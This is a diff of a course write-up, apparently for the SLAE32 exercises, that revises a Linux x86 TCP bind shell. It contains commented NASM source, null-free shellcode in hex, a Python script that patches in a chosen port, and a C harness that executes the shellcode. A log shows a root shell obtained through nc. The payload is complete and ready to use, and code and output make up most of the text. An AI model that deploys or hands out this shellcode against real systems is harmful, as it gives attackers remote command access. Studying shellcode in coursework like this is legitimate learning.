@@ -489,85 +489,124 @@ _start:
 After dumping the hex from the executable, I noticed that there were a tonne of null bytes within the output - which is not good for our payload. In order to remove these, a second draft needs to be looked into and come up with a way to use the same instructions with no null bytes remaining.
 
 ## Second Draft:
-After playing around with the script for a while and testing a few things, I was able to narrow down the total instructions needed to still successfully create a working TCP bind shell. The instructions removed are relatively trivial, but it will help pull down the overall byte size of the hex payload. The main changes I made to the assembly were:
-* removed all xor instructions used to clear a register before moving a value into it
-    * I realised that the mov instruction seems to just overwrite the value, no need to 0 it
-* removed the 3 separate dup2 chunks and instead added a decrementing loop, using the value of the counter as the 2nd parameter value in ECX
-* when using a register to move values into them, use the lower half of the register only
-    * For example, EAX becomes AL or AX (depending on the size of the value), EBX becomes BL, and so on.
+After playing around with the script for a while and testing a few things, I was able to tweak the script a little to remove some bloat and still successfully create a working TCP bind shell. The changes are relatively trivial, but it should help pull down the overall byte size of the payload (marginal), but ultimately it helped me learn some new tricks in x86 such as loops. The main changes I made to the assembly were:
 
-The total source can be seen here:
+* removed all xor instructions used to clear a register before moving a value into it
+    * after removing each of these, I realised that this led to issues when making the system calls. I used strace to attempt to see what was going on. Looking at the following output snippet, we can see that the registers must have had junk left over before using them for our call - resulting in garbage values.
+
+ ```
+ root@kali:~/Documents/slae32/exercise_1/second_bind_shell# strace ./second_bind_shell 
+execve("./second_bind_shell", ["./second_bind_shell"], 0xbfe76800 /* 41 vars */) = 0
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+bind(3, {sa_family=AF_INET, sin_port=htons(9001), sin_addr=inet_addr("1.0.0.0")}, 16) = -1 EADDRNOTAVAIL (Cannot assign requested address)
+syscall_0xffff016b(0x3, 0, 0x10, 0, 0x3, 0) = -1 ENOSYS (Function not implemented)
+syscall_0xffff016c(0x3, 0, 0, 0, 0x3, 0) = -1 ENOSYS (Function not implemented)
+syscall_0xffffff3f(0xffffffda, 0x2, 0, 0, 0xffffffda, 0) = -1 ENOSYS (Function not implemented)
+syscall_0xffffff3f(0xffffffda, 0x1, 0, 0, 0xffffffda, 0) = -1 ENOSYS (Function not implemented)
+syscall_0xffffff3f(0xffffffda, 0, 0, 0, 0xffffffda, 0) = -1 ENOSYS (Function not implemented)
+execve("//bin/sh", [], 0xbf992980 /* 0 vars */) = 0
+```
+
+For example, we can see that our hex value used for a system call (0x016c) exists, however the actual value it is attempting to call is 0xffff016b. This is because we only wrote to the lower half of the register using al, leaving anything already in the higher half of the address. After noticing this, I returned to XOR'ing most of the registers before moving values into them. Especially if I was targetting the lower half (al), to ensure the rest of the memory was zeroed.
+
+* removed the 3 separate dup2 chunks and instead added a decrementing loop, using the value of the counter as the 2nd parameter value in ECX. Each iteration would decrement the ECX value down to 0 and check the current value before continuing the loop. If our value was not 0, we would jump back to the beginning of the loop and repeat our previous steps. If our value was 0, we have succesfully called dup2 three seperate times with the 2, 1 and 0 values in the 2nd parameter (ECX) and can safely exit the loop.
+* when using a register to move values into them, use the lower half of the register only
+    * For example, EAX becomes AL or AX (depending on the size of the value), EBX becomes BL, and so on. Ultimately, this was done to prevent any NULL bytes (\x00) from existing in my final payload.
+
+The total source of our second bind shell attempt can be seen here:
 
 ```
-global  _start
+global	_start
 section .text
 
 _start:
-    ; SOCKET SYSCALL
-    mov eax, 0x167
-    mov ebx, 0x2
-    mov ecx, 0x1
+	xor eax, eax
+	xor ebx, ebx
+	xor ecx, ecx
+	xor edx, edx
 
-    int 0x80
-    mov edi, eax
+	; SOCKET SYSCALL
+	; socket is the first syscall we want with syscall number is 359 (0x167)
+	; EAX = syscall number, ebx = param 1 (2), ecx = param 2 (1), edx = param 3 (0)
+	mov ax, 0x167
+	mov bl, 0x2
+	mov cl, 0x1
+	; we don't do anything with edx as 0 already exists from the xor above
 
-    ; BIND syscall
-    mov eax, 0x169
-    mov ebx, edi
+	int 0x80 ; this interrupt signal handles the syscall
+	mov edi, eax ; store the return value in edi for future ref
 
-    ; create our sockaddr struct in memory, used with bind() call, 2nd param
-    xor ecx, ecx
-    push ecx
-    push ecx
-    push word 0x2923
-    push word 0x2
+	; BIND syscall
+	xor eax, eax
+	mov ax, 0x169	; move 361 into syscall register
+	mov ebx, edi	; move fd (edi val) into ebx - param 1
 
-    mov ecx, esp
-    mov edx, 16
-    int 0x80
+	; create our sockaddr struct in memory, used with bind() call, 2nd param
+	xor ecx, ecx
+	push ecx	 ; push the 0 onto the stack (4th struct value)
+	push ecx  	 ; push the 0 onto the stack (Address)
+	push word 0x2923 ; push the port onto stack  (0x2329) (PORT NUM = 9001) 
+	push word 0x2	 ; push 2 onto the stack     (AF_INET)
 
-    ; LISTEN syscall 363
-    mov eax, 0x16b
-    mov ebx, edi
-    xor ecx, ecx
-    int 0x80
+	mov ecx, esp	; store the current stack pointer into ecx, points at struct
+	xor edx, edx
+	mov dl, 16	; this parameter takes the length of the addr (param 3)
+	int 0x80	; syscall 
 
-    ; ACCEPT syscall 364
-    mov eax, 0x16c
-    mov ebx, edi
-    xor ecx, ecx
-    xor edx, edx
-    xor esi, esi
-    int 0x80
-    mov edi, eax         ; back up the fd value in edi again
+	; LISTEN syscall 363
+	xor eax, eax
+	mov ax, 0x16b  ; move 363 into register (syscall number)
+	mov ebx, edi    ; this should still be return val from socket() -> fd
+	xor ecx, ecx    ; clean out ecx as the 2nd param value should be 0
+	int 0x80	; syscall
 
-    ; DUP2 syscall (3 times)
-    mov ecx, 0x3         ; set counter register to 3 for counting down in the loop
+	; ACCEPT syscall 364
+	xor eax, eax
+	mov ax, 0x16c	; move 364 into register (syscall number)
+	mov ebx, edi	; this should still be return val from socket() -> fd
+	xor ecx, ecx	; zero out 2nd param (NULL)
+	xor edx, edx	; zero out 3rd param (NULL)
+	xor esi, esi
+	int 0x80	; syscall
 
-    for_loop_dup2:
-    mov eax, 0x3f
-    mov ebx, edi
-    dec ecx              ; decrement our counter before the syscall (should be 2, 1, 0)
-    int 0x80
-    
-    jnz for_loop_dup2    ; if count is not 0, jump back to the start of the loop
+	; accept() returns a new fd value, so let's store this one off too
+	mov edi, eax	; back up the fd value in edi again
 
-    ; EXECVE() syscall
-    xor eax, eax
-    push eax
+	; DUP2 syscall (3 times)
+	xor ecx, ecx
+	mov cl, 0x3	; set counter register to 3 for counting down in the loop
 
-    push 0x68732f6e
-    push 0x69622f2f
-    mov ebx, esp
+	for_loop_dup2:
+	xor eax, eax
+	mov al, 0x3f
+	mov ebx, edi
+	dec cl		; decrement our counter before the syscall (should be 2, 1, 0)
+	int 0x80
+	
+	jnz for_loop_dup2	; if ecx is not equal to 0, keep going
 
-    push eax
-    mov ecx, esp
+	; EXECVE() syscall
+	xor eax, eax	; zero out eax ready for pushing 0s on to the stack
+	push eax	; push first zero on, align the stack?
 
-    push eax
-    mov edx, esp
+	; "/bin/sh" in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68
+	; we flip these because it's little endian
+	; 0x68732f6e, 0x69622f
 
-    mov eax, 0xb
-    int 0x80
+	push 0x68732f6e
+	push 0x69622f2f	; note the // at the end, sigsevs without - junk corrupting it?
+
+	mov ebx, esp	; push the addr of our above string (esp) into 1st param
+
+	push eax        ; push 0 onto the stack (2nd param == NULL)
+    mov ecx, esp    ; requires a pointer - man page has them for usage
+
+	push eax	; push 0 onto the stack (3rd param == NULL)
+	mov edx, esp	; requires a pointer - man page has them for usage
+
+    mov al, 0xb    ; move 11 into EAX register (syscall number)
+
+	int 0x80	; final syscall
 ```
 
 Dumping the hex for usage:
@@ -581,8 +620,9 @@ objdump -d "$1" |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr 
 Usage:
 
 ```
-root@kali:~/Documents/slae32/exercise_1# ../misc/dump_hex.sh second_bind_shell/second_bind_shell
-"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80"
+root@kali:~/Documents/slae32/exercise_1/second_bind_shell# ../../misc/dump_hex.sh second_bind_shell
+"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80"
+
 ```
 
 As the above output shows, I have successfully tweaked my initial bind shell script to remove all null bytes during the second draft of the shell. The output also includes two \'s because the actual value, allowing direct usage within a python string. We need the two back slash characters to ensure a single \ remains in the final output.
@@ -600,27 +640,28 @@ import sys
 import socket
 
 shellcode = ("\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01"
-        "\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69"
-        "\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68[p2][p1]\\x66\\x6a"
-        "\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01"
-        "\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89"
-        "\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x31\\xff\\x89\\xc7"
-        "\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75"
-        "\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62"
-        "\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80"
+	"\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69"
+	"\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68[p2][p1]\\x66\\x6a"
+	"\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8"
+	"\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c"
+	"\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc7"
+	"\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd"
+	"\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f"
+	"\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b"
+	"\\xcd\\x80"
 )
 
 if len(sys.argv) != 2:
-        print 'Usage: ' + sys.argv[0] + ' <port>'
-        sys.exit()
+	print 'Usage: ' + sys.argv[0] + ' <port>'
+	sys.exit()
 
 port = sys.argv[1]
 print "Chosen port: %s" % port
 
 int_port = int(port)
 if int_port > 65535:
-        print "Port choice is greater than max value (65535)"
-        sys.exit()
+	print "Port choice is greater than max value (65535)"
+	sys.exit()
 
 htons_port_val = socket.htons(int_port)
 hex_port_value = hex(htons_port_val)
@@ -645,14 +686,14 @@ print shellcode
 As we can see in the above shellcode value, there are two placeholder values [p2] and [p1], these are the two hex values that are replaced with the target port, specified at runtime. Once edited, the final shellcode is output to the screen, as seen in the following usage example:
 
 ```
-root@kali:~/Documents/slae32/exercise_1# python wrapper.py 5566
-Chosen port: 5566
-1st port: \xbe
-2nd port: \x15
+root@kali:~/Documents/slae32/exercise_1# python wrapper.py 9003
+Chosen port: 9003
+1st port: \x2b
+2nd port: \x23
 
 Ammending shellcode...
 Final Shellcode:
-\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x15\xbe\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80
+\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x23\x2b\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80
 ```
 
 Our final step is to utilise this hex output within an executable that injects the shellcode directly into the process memory and executes it, binding out shell. This can be completed in various languages, for example C# is an ideal candidate for a Windows shell. As I am working within a Unix environment I wrote my executable in C.
@@ -662,13 +703,12 @@ root@kali:~/Documents/slae32/exercise_1# cat shell.c
 #include<stdio.h>
 #include<string.h>
 
-unsigned char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x15\xbe\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";
+unsigned char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x23\x2b\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";
 
-void main(void)
-{
-        printf("Shellcode Length:  %d\n", strlen(code));
-        int (*ret)() = (int(*)())code;
-        ret();
+int main(void)  {
+    printf("Shellcode Length:  %d\n", strlen(code));
+    int (*ret)() = (int(*)())code;
+    ret();
 }
 ```
 
@@ -676,9 +716,9 @@ Compiling and executing:
 ```
 root@kali:~/Documents/slae32/exercise_1# gcc -fno-stack-protector -z execstack shell.c -o shell
 root@kali:~/Documents/slae32/exercise_1# ./shell 
-Shellcode Length:  116
+Shellcode Length:  118
 
-root@kali:~# nc localhost 5566
+root@kali:~# nc localhost 9003
 id
 uid=0(root) gid=0(root) groups=0(root)
 pwd
@@ -686,4 +726,4 @@ pwd
 ```
 
 ## Additional:
-todo
+todo - amend this section to include any course details ready for submission. For now, the write ups will just be live.
